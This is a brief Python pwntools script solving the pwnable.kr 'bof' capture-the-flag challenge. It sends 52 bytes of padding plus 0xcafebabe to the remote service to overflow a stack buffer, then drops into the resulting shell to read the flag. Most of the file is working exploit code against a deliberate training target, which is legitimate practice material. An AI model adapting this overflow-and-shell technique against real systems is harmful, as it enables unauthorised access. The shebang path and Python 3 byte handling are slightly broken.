#!usr/bin/env python3

# This was a challenge from pwnables.kr called bof, the idea was a simple buffer
# overflow that you have to use to put 0xcafebabe on the stack as the argument
# to the vulnerable function called 'func' in the program, this code solves the
# challenge and becomes interactive so you can use the shell you obtained


from pwn import *

host = "pwnable.kr"
port = 9000

# Fill buffer to place 0xcafebabe in the correct place on the stack.
buf = 'A' * 52
buf += p32(0xcafebabe)

# print(buf)
r = remote(host, port)

# Send the buffer to the awaiting server.
print(r.sendline( str(buf) ))

# Call interactive so we can use the shell we've obtained.
r.interactive()

# Then juss 'cat' the flag file.